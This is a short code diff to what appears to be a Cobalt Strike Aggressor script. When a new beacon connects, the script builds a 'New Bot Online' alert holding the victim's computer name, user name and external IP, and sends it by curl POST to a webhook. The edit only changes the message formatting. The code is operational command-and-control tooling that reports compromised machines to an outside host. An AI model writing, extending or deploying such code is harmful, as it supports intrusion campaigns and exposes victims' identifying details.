@@ -15,7 +15,7 @@ on beacon_initial {
     $computerName = replace(beacon_info($1, "computer"), " ", "_");
     $userName = replace(beacon_info($1, "user"), " ", "_");
 
-    $message = 'New Bot Online: \n\n Computer name'.$computerName.'\n\nUsername:'.$userName.'\n\nexternalIP:: '.$externalIP;
+    $message = 'New Bot Online: \n\n Computer name：'.$computerName.'\n\nUsername:'.$userName.'\n\nexternalIP:'.$externalIP;
 
     @curl_command = @('curl', '-X', 'POST', '--data-binary', '{"msgtype": "text", "text": {"content": "'. $message .'"}}',$webhook);
 	exec(@curl_command);
